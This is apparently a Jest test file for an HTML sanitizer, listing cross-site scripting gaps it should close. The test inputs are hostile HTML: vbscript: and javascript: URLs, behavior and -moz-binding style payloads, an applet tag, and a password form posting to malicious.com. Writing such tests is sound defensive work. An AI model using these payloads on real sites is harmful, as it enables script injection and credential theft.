import { sanitizeHTML } from './sanitizer';

describe('sanitizer security gaps', () => {
  test('misses vbscript:', () => {
    const html = '<a href="vbscript:msgbox(1)">click</a>';
    expect(sanitizeHTML(html)).not.toContain('vbscript:');
  });

  test('misses background attribute', () => {
    const html = '<table background="javascript:alert(1)"></table>';
    expect(sanitizeHTML(html)).not.toContain('background=');
  });

  test('misses form tags', () => {
    const html =
      '<form action="https://malicious.com"><input name="password" type="password"><button>Submit</button></form>';
    const out = sanitizeHTML(html);
    expect(out).not.toContain('<form');
    expect(out).not.toContain('<input');
    expect(out).not.toContain('<button');
  });

  test('misses video/audio tags', () => {
    const html =
      '<video><source src="javascript:alert(1)"></video><audio src="javascript:alert(2)"></audio>';
    const out = sanitizeHTML(html);
    expect(out).not.toContain('<video');
    expect(out).not.toContain('<audio');
  });

  test('misses behavior and moz-binding in style', () => {
    const html = '<div style="behavior: url(xss.htc); -moz-binding: url(xss.xml);"></div>';
    const out = sanitizeHTML(html);
    expect(out).not.toContain('style=');
  });

  test('misses xlink:href', () => {
    const html = '<a xlink:href="javascript:alert(1)">click</a>';
    const out = sanitizeHTML(html);
    expect(out).not.toContain('xlink:href');
  });

  test('misses applet/canvas/frame/frameset', () => {
    const html =
      '<applet code="XSS.class"></applet><canvas></canvas><frameset><frame src="javascript:alert(1)"></frameset>';
    const out = sanitizeHTML(html);
    expect(out).not.toContain('<applet');
    expect(out).not.toContain('<canvas');
    expect(out).not.toContain('<frameset');
    expect(out).not.toContain('<frame');
  });
});
